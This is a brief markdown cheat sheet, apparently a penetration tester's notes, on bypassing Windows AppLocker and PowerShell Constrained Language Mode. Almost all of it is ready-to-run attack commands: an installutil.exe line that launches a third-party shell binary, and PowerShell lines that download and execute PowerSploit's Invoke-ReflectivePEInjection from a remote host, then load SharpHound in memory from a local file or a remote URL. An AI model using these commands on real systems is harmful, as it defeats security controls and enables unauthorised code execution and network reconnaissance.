# Applocker
## Check Powershell Language Mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```
## Bypass CLM
[FLM-Shell](https://github.com/an3m0ne/FLM-Shell)
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\an3m0ne\FLM-Shell.exe
```

## Bypass Applocker
https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
```powershell
IEX(New-Object Net.WebClient).downloadString('http://192.168.0.1/Invoke-ReflectivePEInjection.ps1')

#local
$PEBytes = [IO.File]::ReadAllBytes('SharpHound.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

#remote
$PEBytes = (New-Object System.Net.WebClient).DownloadData("http://192.168.0.1/SharpHound.exe")
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
```
